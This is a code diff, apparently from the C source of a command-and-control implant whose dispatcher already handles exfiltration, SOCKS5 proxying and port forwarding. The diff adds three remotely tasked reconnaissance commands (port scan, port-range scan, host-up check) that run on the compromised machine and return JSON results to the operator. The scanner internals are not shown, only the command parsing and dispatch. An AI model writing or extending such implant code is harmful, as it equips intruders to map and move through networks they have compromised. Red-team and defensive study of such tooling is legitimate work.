@@ -24,6 +24,7 @@
 #include "../../include/exfil/exfil.h"
 #include "../../include/network/socks5.h"
 #include "../../include/network/portfwd.h"
+#include "../../include/recon/scanner.h"
 
 /* ============================================================================
  * Parser JSON minimal
@@ -201,6 +202,12 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_PORTFWD_REMOVE;
   if (str_icmp(cmd, "portfwd_list") == 0)
     return CMD_PORTFWD_LIST;
+  if (str_icmp(cmd, "scan_ports") == 0)
+    return CMD_SCAN_PORTS;
+  if (str_icmp(cmd, "scan_range") == 0)
+    return CMD_SCAN_RANGE;
+  if (str_icmp(cmd, "scan_host") == 0)
+    return CMD_SCAN_HOST;
 
   return CMD_NONE;
 }
@@ -820,6 +827,73 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
         result->output_len = result->output ? strlen(result->output) : 0;
         status = STATUS_FAILURE;
       }
+    }
+    break;
+
+  case CMD_SCAN_PORTS:
+    {
+      // args = target (IP ou hostname)
+      if (task->args && strlen(task->args) > 0) {
+        char* scan_json = NULL;
+        if (Scanner_ScanPorts(task->args, &scan_json)) {
+          result->output = scan_json;
+          result->output_len = scan_json ? strlen(scan_json) : 0;
+          status = STATUS_SUCCESS;
+        } else {
+          result->output = str_dup("Port scan failed");
+          status = STATUS_FAILURE;
+        }
+      } else {
+        result->output = str_dup("No target specified");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_SCAN_RANGE:
+    {
+      // args = "target,startPort,endPort"
+      char target[256] = {0};
+      int startPort = 1, endPort = 1024;
+      if (task->args) {
+        sscanf(task->args, "%255[^,],%d,%d", target, &startPort, &endPort);
+      }
+      if (target[0]) {
+        char* scan_json = NULL;
+        if (Scanner_ScanRange(target, (USHORT)startPort, (USHORT)endPort, &scan_json)) {
+          result->output = scan_json;
+          result->output_len = scan_json ? strlen(scan_json) : 0;
+          status = STATUS_SUCCESS;
+        } else {
+          result->output = str_dup("Range scan failed");
+          status = STATUS_FAILURE;
+        }
+      } else {
+        result->output = str_dup("No target specified");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_SCAN_HOST:
+    {
+      // args = target
+      if (task->args && strlen(task->args) > 0) {
+        BOOL isUp = FALSE;
+        if (Scanner_IsHostUp(task->args, &isUp)) {
+          result->output = str_dup(isUp ? "Host is UP" : "Host is DOWN");
+          status = STATUS_SUCCESS;
+        } else {
+          result->output = str_dup("Host check failed");
+          status = STATUS_FAILURE;
+        }
+      } else {
+        result->output = str_dup("No target specified");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
     }
     break;
 
